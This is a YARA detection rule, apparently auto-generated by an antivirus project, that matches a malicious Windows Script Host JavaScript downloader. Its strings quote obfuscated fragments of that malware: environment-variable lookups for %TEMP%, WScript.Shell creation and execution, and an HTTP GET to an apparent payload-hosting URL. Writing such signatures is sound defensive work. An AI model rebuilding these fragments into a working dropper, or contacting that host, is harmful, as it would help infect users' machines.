rule sig_20160428_de5245c5675ec01957c470aaaebcd065 {
  meta:
    description = "datamaliciousorder - file 20160428_de5245c5675ec01957c470aaaebcd065.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "594250a50feaa84f5ff27b516ecea0da81a959c0a3a6005448c6df2e5f7e122b"

  strings:
    $s1  = "function CoiAriQryJagThsMtfWhu() {return KdfOfiVsbCqfMjiJnhXmd[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s2  = "function XxnIxdGanZftXewBziKop(EiePxwTwtPvfWwwDehLgi){KdfOfiVsbCqfMjiJnhXmd[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function XxnIxdGanZftXewBziKop(EiePxwTwtPvfWwwDehLgi){KdfOfiVsbCqfMjiJnhXmd[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "var KdfOfiVsbCqfMjiJnhXmd = function CbpOipXyrRezRhmBxyNwp() {return XvxCdcWpgDenHrjLddCqy[EzzVzgTxbDdwAmxSnzJbl](\"WScript\"+\"" ascii
    $s5  = "return JrvQlfEuzDitYafKbeStu - AegIqaBusJtsRapKkbQnc;};" fullword ascii
    $s6  = "function KjuCdvDnnBlaFfdNgrLdk(JrvQlfEuzDitYafKbeStu, AegIqaBusJtsRapKkbQnc){JnwCbbHcyXtwIcxEduQcm = JnwCbbHcyXtwIcxEduQcm * 1; " ascii
    $s7  = "function CoiAriQryJagThsMtfWhu() {return KdfOfiVsbCqfMjiJnhXmd[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s8  = "TfgCjdCquMlkAvpOghMrv[XjhBxcGbcHpxIrmCgrFto](\"G\" + \"ET\", \"http://test.barbasov.ru/z0olqa\", false);" fullword ascii
    $s9  = "var XvxCdcWpgDenHrjLddCqy = this[\"WScript\"];" fullword ascii
    $s10 = "var KdfOfiVsbCqfMjiJnhXmd = function CbpOipXyrRezRhmBxyNwp() {return XvxCdcWpgDenHrjLddCqy[EzzVzgTxbDdwAmxSnzJbl](\"WScript\"+\"" ascii
    $s11 = "function KjuCdvDnnBlaFfdNgrLdk(JrvQlfEuzDitYafKbeStu, AegIqaBusJtsRapKkbQnc){JnwCbbHcyXtwIcxEduQcm = JnwCbbHcyXtwIcxEduQcm * 1; " ascii
    $s12 = "function EuxTksLxdQsoExtEbmWdu(){return VpqHotRegQlxLgzIwjUbt + \"\";};" fullword ascii
    $s13 = "if (TfgCjdCquMlkAvpOghMrv[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s14 = "function AceDsfTwpSyeXtrOkdOag() {return ((IycXeeDosVooEdhFvzDhe == true) && (IycXeeDosVooEdhFvzDhe == AszFznBjbDxgBbzLpvQvl)) ?" ascii
    $s15 = "function AceDsfTwpSyeXtrOkdOag() {return ((IycXeeDosVooEdhFvzDhe == true) && (IycXeeDosVooEdhFvzDhe == AszFznBjbDxgBbzLpvQvl)) ?" ascii
    $s16 = "function SumVfcZkgJvlNeaCpmIlo(RlgVmkXtoEkwNlzHcfEhv) {var SooDmmQpfMsjPmtPotHco = (1, 2, 3, 4, 5, RlgVmkXtoEkwNlzHcfEhv); retur" ascii
    $s17 = "var AszFznBjbDxgBbzLpvQvl = false;" fullword ascii
    $s18 = "return KjuCdvDnnBlaFfdNgrLdk(1 == 1 ? AreMidUrrTzfBdoRxkSdc : 0, 1 == 1 ? YptShjCjiUnrSsySmzHhy : 0);" fullword ascii
    $s19 = "function ZdiElcWrdWceAqrSlaHpl(){return 23;};" fullword ascii
    $s20 = "var IycXeeDosVooEdhFvzDhe = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}